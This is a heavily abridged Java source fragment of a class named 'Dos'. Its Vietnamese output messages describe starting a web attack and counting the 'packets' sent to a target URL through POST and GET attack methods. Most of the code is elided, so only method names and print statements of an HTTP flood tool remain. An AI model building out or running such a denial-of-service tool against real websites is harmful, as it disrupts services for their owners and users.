...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Bắt đầu tấn công web: " + url);
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Số lượng Packet đã đánh vào "+url+"là: "+responseCode);     
    }
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Số lượng Packet đã đánh vào "+url+" là: "+this.seq);  
    }
